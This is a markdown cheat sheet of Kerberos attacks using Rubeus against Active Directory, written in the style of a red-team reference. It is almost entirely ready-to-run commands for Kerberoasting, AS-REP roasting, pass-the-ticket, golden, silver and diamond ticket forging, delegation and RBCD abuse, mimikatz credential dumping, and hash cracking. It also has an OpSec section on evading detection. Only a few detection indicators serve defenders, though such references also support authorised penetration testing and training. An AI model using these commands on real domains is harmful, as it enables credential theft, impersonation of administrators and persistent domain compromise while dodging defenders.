# Rubeus Attack Techniques

Comprehensive documentation for Kerberos attacks using Rubeus, including Kerberoasting, AS-REP Roasting, delegation abuse, and ticket forging.

## Table of Contents

- [AS-REP Roasting](#as-rep-roasting)
- [Kerberoasting](#kerberoasting)
- [Pass-the-Ticket](#pass-the-ticket)
- [Overpass-the-Hash](#overpass-the-hash)
- [Golden Ticket](#golden-ticket)
- [Silver Ticket](#silver-ticket)
- [Diamond Ticket](#diamond-ticket)
- [S4U Delegation Abuse](#s4u-delegation-abuse)
- [Constrained Delegation](#constrained-delegation)
- [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
- [OpSec Notes](#opsec-notes)

---

## AS-REP Roasting

AS-REP Roasting targets accounts with "Do not require Kerberos preauthentication" enabled. The KDC returns an AS-REP containing data encrypted with the user's password hash, which can be cracked offline.

### Basic AS-REP Roast

```powershell
# Roast all vulnerable users (requires domain user context)
Rubeus.exe asreproast

# Output to file in hashcat format
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# John format
Rubeus.exe asreproast /format:john /outfile:asrep_john.txt

# Clean output without wrapping
Rubeus.exe asreproast /nowrap
```

### Targeted AS-REP Roast

```powershell
# Target specific user
Rubeus.exe asreproast /user:svc_backup

# Target users from file
Rubeus.exe asreproast /users:targets.txt

# Specify domain and DC
Rubeus.exe asreproast /domain:corp.local /dc:dc01.corp.local
```

### Unauthenticated AS-REP Roast

```powershell
# No domain credentials needed - just need to know vulnerable usernames
Rubeus.exe asreproast /user:svc_backup /domain:corp.local /dc:10.10.10.1

# With user list
Rubeus.exe asreproast /users:users.txt /domain:corp.local /dc:10.10.10.1
```

### Cracking AS-REP Hashes

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# With rules
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r best64.rule

# John the Ripper
john --wordlist=wordlist.txt asrep_john.txt
```

### Finding AS-REP Roastable Users

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# LDAP query
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# BloodHound
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

---

## Kerberoasting

Kerberoasting extracts TGS tickets for service accounts (accounts with SPNs) to crack offline.

### Basic Kerberoast

```powershell
# Roast all kerberoastable accounts
Rubeus.exe kerberoast

# Output to file
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Clean output for parsing
Rubeus.exe kerberoast /nowrap

# Stats only (enumerate without requesting tickets)
Rubeus.exe kerberoast /stats
```

### Targeted Kerberoast

```powershell
# Target specific user
Rubeus.exe kerberoast /user:svc_sql

# Target specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/sql.corp.local:1433

# Multiple users from file
Rubeus.exe kerberoast /users:svc_accounts.txt
```

### Stealthy Kerberoast

```powershell
# Request AES tickets (less suspicious than RC4)
Rubeus.exe kerberoast /aes

# Request specific encryption type
Rubeus.exe kerberoast /tgtdeleg  # Use current TGT's session key

# OpSec mode (various evasions)
Rubeus.exe kerberoast /opsec

# Delay between requests
Rubeus.exe kerberoast /delay:1000
```

### Using Alternate Credentials

```powershell
# With plaintext password
Rubeus.exe kerberoast /creduser:corp.local\user /credpassword:Pass123!

# With NTLM hash
Rubeus.exe kerberoast /creduser:corp.local\user /rc4:HASH
```

### Kerberoast Output Formats

```powershell
# Hashcat format (default)
# $krb5tgs$23$*user$realm$spn*$hash

# John format
Rubeus.exe kerberoast /format:john
# $krb5tgs$user:hash

# Simple format
Rubeus.exe kerberoast /simple
```

### Cracking Kerberoast Hashes

```bash
# RC4 (TGS-REP etype 23) - Mode 13100
hashcat -m 13100 kerberoast.txt wordlist.txt

# AES256 (TGS-REP etype 18) - Mode 19700
hashcat -m 19700 kerberoast_aes.txt wordlist.txt

# AES128 (TGS-REP etype 17) - Mode 19600
hashcat -m 19600 kerberoast_aes128.txt wordlist.txt
```

### Finding Kerberoastable Users

```powershell
# PowerView
Get-DomainUser -SPN

# LDAP query
(&(objectCategory=user)(servicePrincipalName=*))

# BloodHound
MATCH (u:User {hasspn:true}) RETURN u.name
```

---

## Pass-the-Ticket

Inject Kerberos tickets into the current session to assume another identity.

### Inject Ticket from Base64

```powershell
# Inject ticket (base64 blob from other Rubeus commands)
Rubeus.exe ptt /ticket:doIFNjCCBTK...

# From file
Rubeus.exe ptt /ticket:admin.kirbi

# Inject multiple tickets
Rubeus.exe ptt /ticket:ticket1.kirbi /ticket:ticket2.kirbi
```

### Inject into Specific LUID

```powershell
# Create new logon session and inject
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
# Note the LUID, then inject:
Rubeus.exe ptt /luid:0x123456 /ticket:admin.kirbi
```

### Pass-the-Ticket Workflow

```powershell
# 1. Request TGT with credentials
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local

# 2. Copy base64 ticket output

# 3. On another machine, inject ticket
Rubeus.exe ptt /ticket:doIFNjCCBTK...

# 4. Verify ticket
Rubeus.exe klist

# 5. Access resources
dir \\dc01.corp.local\c$
```

### Purge Tickets

```powershell
# Purge all tickets from current session
Rubeus.exe purge

# Purge specific LUID
Rubeus.exe purge /luid:0x123456
```

---

## Overpass-the-Hash

Request a TGT using an NTLM hash or AES key, converting hash-based auth to Kerberos.

### With NTLM Hash

```powershell
# Request TGT and inject
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /domain:corp.local /ptt

# Request TGT and save to file
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /domain:corp.local /outfile:admin.kirbi

# Create new logon session with TGT
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /domain:corp.local /createnetonly:C:\Windows\System32\cmd.exe /show
```

### With AES Keys (Stealthier)

```powershell
# AES256 key
Rubeus.exe asktgt /user:admin /aes256:AES256_KEY /domain:corp.local /ptt

# AES128 key
Rubeus.exe asktgt /user:admin /aes128:AES128_KEY /domain:corp.local /ptt

# OpSec mode with AES
Rubeus.exe asktgt /user:admin /aes256:AES256_KEY /domain:corp.local /opsec /ptt
```

### With Password

```powershell
# Request TGT with password
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /ptt

# Specify encryption type
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local /enctype:aes256 /ptt
```

### Cross-Domain

```powershell
# Request TGT for another domain
Rubeus.exe asktgt /user:admin /rc4:HASH /domain:child.corp.local /dc:dc01.child.corp.local /ptt
```

---

## Golden Ticket

Forge a TGT using the krbtgt hash for persistent domain access.

### Create Golden Ticket

```powershell
# With NTLM hash
Rubeus.exe golden /rc4:KRBTGT_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt

# With AES256 key (stealthier)
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt

# Save to file
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /outfile:golden.kirbi
```

### Golden Ticket Options

```powershell
# Specify user ID (500 = built-in admin)
Rubeus.exe golden /aes256:KEY /user:FakeAdmin /id:500 /domain:corp.local /sid:S-1-5-21-... /ptt

# Specify groups (512=Domain Admins, 519=Enterprise Admins, etc.)
Rubeus.exe golden /aes256:KEY /user:FakeAdmin /groups:512,519,518,520 /domain:corp.local /sid:S-1-5-21-... /ptt

# Specify ticket lifetime
Rubeus.exe golden /aes256:KEY /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Include extra SIDs (for cross-domain attacks)
Rubeus.exe golden /aes256:KEY /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /sids:S-1-5-21-ENTERPRISE-519 /ptt
```

### Get Required Information

```powershell
# Get krbtgt hash via DCSync (mimikatz or secretsdump)
lsadump::dcsync /user:krbtgt /domain:corp.local

# Get Domain SID
whoami /user
# Or: Get-ADDomain | Select-Object DomainSID
# Or: wmic useraccount get name,sid
```

---

## Silver Ticket

Forge a TGS for a specific service using the service account hash.

### Create Silver Ticket

```powershell
# CIFS service (file share access)
Rubeus.exe silver /service:cifs/fileserver.corp.local /rc4:SERVICE_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt

# HTTP service (web/WinRM)
Rubeus.exe silver /service:http/webserver.corp.local /rc4:SERVICE_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt

# LDAP service (LDAP queries)
Rubeus.exe silver /service:ldap/dc01.corp.local /rc4:DC_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /ptt
```

### Silver Ticket with AES

```powershell
# Stealthier with AES256
Rubeus.exe silver /service:cifs/server.corp.local /aes256:SERVICE_AES256 /user:Admin /domain:corp.local /sid:S-1-5-21-... /ptt
```

### Common Service SPNs

| Service | SPN Format | Use Case |
|---------|------------|----------|
| CIFS | cifs/hostname | SMB/File shares |
| HTTP | http/hostname | WinRM/Web services |
| HOST | host/hostname | PsExec/Scheduled tasks |
| LDAP | ldap/hostname | LDAP queries |
| MSSQLSvc | mssqlsvc/hostname:port | SQL Server |
| WSMAN | wsman/hostname | PowerShell Remoting |
| RPCSS | rpcss/hostname | WMI |

### Get Service Account Hash

```powershell
# For services running as SYSTEM, use computer account hash
# Dump from target machine:
mimikatz # sekurlsa::logonpasswords
# Look for COMPUTER$ account

# For services with dedicated service account:
# DCSync the service account
lsadump::dcsync /user:svc_sql /domain:corp.local
```

---

## Diamond Ticket

Create a ticket by modifying a legitimately requested TGT, making it harder to detect than Golden Tickets.

### Create Diamond Ticket

```powershell
# Request TGT and modify PAC with krbtgt key
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:admin /password:Pass123! /enctype:aes /domain:corp.local /dc:dc01.corp.local /ticketuser:FakeAdmin /ticketuserid:500 /groups:512 /ptt

# Using existing TGT
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /tgtdeleg /ticketuser:FakeAdmin /ticketuserid:500 /groups:512 /ptt
```

### Diamond vs Golden Ticket

| Aspect | Golden Ticket | Diamond Ticket |
|--------|---------------|----------------|
| TGT Source | Fully forged | Modified real TGT |
| Detection | Easier (no AS-REQ) | Harder (has AS-REQ) |
| Event 4768 | Missing | Present |
| PAC validation | May fail strict checks | More likely to pass |

---

## S4U Delegation Abuse

Abuse Service for User (S4U) extensions to impersonate users.

### S4U2Self - Impersonate Any User

```powershell
# Get TGS for any user to a service you control
Rubeus.exe s4u /user:ComputerAccount$ /rc4:COMPUTER_HASH /impersonateuser:admin /msdsspn:cifs/target.corp.local /ptt

# With AES key
Rubeus.exe s4u /user:ComputerAccount$ /aes256:COMP_AES256 /impersonateuser:admin /msdsspn:cifs/target.corp.local /ptt
```

### S4U2Proxy - Request TGS as Impersonated User

```powershell
# S4U2Self then S4U2Proxy
Rubeus.exe s4u /user:svc_web$ /rc4:SVC_HASH /impersonateuser:admin /msdsspn:cifs/fileserver.corp.local /altservice:http /ptt

# Specify domain and DC
Rubeus.exe s4u /user:svc_web$ /rc4:SVC_HASH /impersonateuser:admin /msdsspn:cifs/fileserver.corp.local /domain:corp.local /dc:dc01.corp.local /ptt
```

### S4U with Ticket

```powershell
# Use existing TGT for S4U
Rubeus.exe s4u /ticket:base64_TGT /impersonateuser:admin /msdsspn:cifs/target.corp.local /ptt

# From file
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:admin /msdsspn:cifs/target.corp.local /ptt
```

---

## Constrained Delegation

Abuse msDS-AllowedToDelegateTo attribute.

### Identify Constrained Delegation

```powershell
# PowerView
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth

# LDAP query
(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))
(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))
```

### Abuse Constrained Delegation

```powershell
# 1. Get TGT for delegating account
Rubeus.exe asktgt /user:svc_sql /rc4:HASH /domain:corp.local /outfile:svc.kirbi

# 2. S4U to impersonate admin to target service
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt

# Combined
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt
```

### Alternate Service Abuse

Services are interchangeable for same target:

```powershell
# Configured for http, abuse for cifs
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:admin /msdsspn:http/server.corp.local /altservice:cifs /ptt
```

---

## Resource-Based Constrained Delegation

Abuse msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

### RBCD Attack Prerequisites

1. Control an account with SPN (computer account or service account)
2. Write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity

### Attack Steps

```powershell
# 1. Create or identify controlled computer account
# If GenericAll/GenericWrite on target, can modify RBCD

# 2. Add controlled account to target's msDS-AllowedToActOnBehalfOfOtherIdentity
# PowerView:
Set-DomainObject -Identity target$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD}

# 3. Get TGT for controlled account
Rubeus.exe asktgt /user:controlled$ /rc4:CONTROLLED_HASH /outfile:controlled.kirbi

# 4. S4U to impersonate admin
Rubeus.exe s4u /ticket:controlled.kirbi /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# 5. Access target
dir \\target.corp.local\c$
```

### RBCD with New Computer Account

```powershell
# 1. Create computer account (if ms-DS-MachineAccountQuota > 0)
# Impacket:
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123' corp.local/user:pass

# 2. Configure RBCD on target
# PowerView with GenericWrite on target:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-YOURPC_SID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity target$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 3. Request TGT and S4U
Rubeus.exe s4u /user:YOURPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
```

---

## OpSec Notes

### Encryption Type Selection

| Type | OpSec | Notes |
|------|-------|-------|
| RC4 (etype 23) | Poor | Easy to detect, often flagged |
| AES128 (etype 17) | Better | Less common in attacks |
| AES256 (etype 18) | Best | Matches normal traffic |

```powershell
# Always prefer AES when possible
Rubeus.exe asktgt /user:admin /aes256:KEY /opsec
Rubeus.exe kerberoast /aes
```

### Ticket Anomaly Detection

**Golden Ticket Indicators:**
- TGT without corresponding AS-REQ (Event 4768)
- Unusual ticket lifetime (default 10 years)
- Non-existent username with valid ticket
- Group memberships mismatch

**Silver Ticket Indicators:**
- TGS without corresponding TGT/AS-REQ
- Service account not matching actual service

### Avoiding Detection

```powershell
# Use domain controller directly
Rubeus.exe asktgt /user:admin /aes256:KEY /dc:dc01.corp.local

# Match legitimate ticket lifetimes
Rubeus.exe golden /aes256:KEY /user:admin /startoffset:0 /endin:600 /renewmax:10080 ...

# Kerberoast specific targets vs all
Rubeus.exe kerberoast /user:svc_sql  # Targeted
# vs
Rubeus.exe kerberoast  # Broad (more noisy)

# Add delays
Rubeus.exe kerberoast /delay:2000
```

### Credential Material Security

```powershell
# Destroy tickets when done
Rubeus.exe purge

# Avoid leaving ticket files
# Use /ptt instead of /outfile when possible
Rubeus.exe asktgt /user:admin /password:Pass123! /ptt
```

---

## References

- [GhostPack Rubeus Wiki](https://github.com/GhostPack/Rubeus/wiki)
- [HarmJ0y - Rubeus Kerberos Abuse](https://blog.harmj0y.net/)
- [SpecterOps - Kerberos Research](https://posts.specterops.io/)
- [AD Security - Kerberos Attacks](https://adsecurity.org/)
